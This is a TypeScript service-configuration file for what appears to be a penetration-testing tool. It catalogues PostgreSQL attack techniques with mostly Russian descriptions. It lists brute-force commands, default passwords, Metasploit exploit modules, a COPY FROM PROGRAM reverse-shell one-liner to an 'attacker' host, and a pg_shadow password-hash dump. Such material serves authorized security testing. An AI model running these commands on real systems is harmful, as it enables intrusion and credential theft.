/**
 * PostgreSQL Service Configuration
 * PostgreSQL Database
 * 
 * @version 1.0.0
 * @author Security Team
 */
import type { ServiceConfig } from '../types';

export const postgresqlConfig: ServiceConfig = {
  id: 'postgresql',
  name: 'PostgreSQL',
  description: 'PostgreSQL - мощная объектно-реляционная СУБД с открытым кодом. Известна расширяемостью и поддержкой стандартов SQL. Может быть скомпрометирована через слабые пароли, COPY FROM PROGRAM, и расширения.',
  categoryId: 'database',
  version: '1.0.0',
  tags: ['database', 'postgresql', 'postgres', 'sql'],

  matchers: {
    serviceNames: ['postgresql', 'postgres'],
    cpePatterns: ['cpe:/a:postgresql:postgresql'],
    bannerRegex: [
      'PostgreSQL',
      'postgres',
      '\\x00\\x03\\x00\\x00',  // PostgreSQL protocol
    ],
    productPatterns: ['PostgreSQL', 'postgres'],
    standardPorts: [5432, 5433, 5434],
    nseScriptMatchers: [
      { scriptName: 'postgresql-info', outputPattern: '.' },
    ],
  },

  confidenceThreshold: 35,

  techniques: [
    {
      id: 'postgresql-enum',
      name: 'PostgreSQL Enumeration',
      mitreId: 'T1046',
      description: 'Сбор информации о PostgreSQL сервере.',
      commands: [
        { tool: 'nmap', command: 'nmap -p 5432 --script postgresql-info <target>', description: 'PostgreSQL info' },
        { tool: 'psql', command: 'psql -h <target> -U postgres', description: 'Connect to PostgreSQL' },
        { tool: 'metasploit', command: 'use auxiliary/scanner/postgres/postgres_version', description: 'Version scan' },
      ],
      nseScripts: [
        { name: 'postgresql-info', description: 'Информация о PostgreSQL', safe: true },
      ],
      difficulty: 'easy',
      tags: ['enumeration', 'reconnaissance'],
    },
    {
      id: 'postgresql-bruteforce',
      name: 'PostgreSQL Brute Force',
      mitreId: 'T1110',
      description: 'Подбор паролей PostgreSQL. postgres - административный пользователь.',
      commands: [
        { tool: 'hydra', command: 'hydra -l postgres -P passwords.txt postgres://<target>', description: 'PostgreSQL brute force' },
        { tool: 'metasploit', command: 'use auxiliary/scanner/postgres/postgres_login', description: 'MSF login scanner' },
        { tool: 'patator', command: 'patator pgsql_login host=<target> user=postgres password=FILE0 0=passwords.txt', description: 'Patator brute force' },
      ],
      difficulty: 'easy',
      notes: 'Попробуйте postgres/postgres, postgres/password, postgres/[empty]',
      tags: ['bruteforce', 'authentication'],
    },
    {
      id: 'postgresql-rce-copy',
      name: 'COPY FROM PROGRAM RCE',
      mitreId: 'T1059',
      description: 'Выполнение команд через COPY FROM PROGRAM (PostgreSQL 9.3+).',
      commands: [
        { tool: 'psql', command: 'COPY (SELECT \'\') TO PROGRAM \'whoami\'', description: 'Test RCE' },
        { tool: 'psql', command: 'COPY (SELECT \'\') TO PROGRAM \'bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\"\'', description: 'Reverse shell' },
        { tool: 'metasploit', command: 'use exploit/linux/postgres/postgres_copy_from_program_cmd_exec', description: 'MSF exploit' },
      ],
      difficulty: 'medium',
      prerequisites: ['Superuser привилегии', 'PostgreSQL 9.3+'],
      tags: ['rce', 'privilege-escalation'],
    },
    {
      id: 'postgresql-udf-rce',
      name: 'UDF RCE',
      mitreId: 'T1059',
      description: 'Выполнение команд через User Defined Functions (libinject).',
      commands: [
        { tool: 'metasploit', command: 'use exploit/linux/postgres/postgres_payload', description: 'UDF payload' },
      ],
      difficulty: 'hard',
      prerequisites: ['Superuser привилегии', 'Права на запись в lib directory'],
      tags: ['rce', 'udf', 'privilege-escalation'],
    },
    {
      id: 'postgresql-dump',
      name: 'Database Dumping',
      mitreId: 'T1005',
      description: 'Извлечение данных из PostgreSQL.',
      commands: [
        { tool: 'pg_dump', command: 'pg_dump -h <target> -U postgres -A', description: 'Full database dump' },
        { tool: 'psql', command: 'psql -h <target> -U postgres -c "\\l"', description: 'List databases' },
        { tool: 'psql', command: 'psql -h <target> -U postgres -c "SELECT * FROM pg_shadow"', description: 'Dump user hashes' },
      ],
      difficulty: 'medium',
      tags: ['data-exfiltration', 'enumeration'],
    },
  ],

  triggers: [],

  ui: {
    icon: 'database',
    color: '#3b82f6',
    displayPriority: 85,
  },

  references: [
    { title: 'PostgreSQL Pentesting', url: 'https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql' },
  ],

  notes: 'PostgreSQL superuser может выполнять команды ОС через COPY FROM PROGRAM или UDF. Проверяйте версию для определения доступных техник.',
};

export default postgresqlConfig;
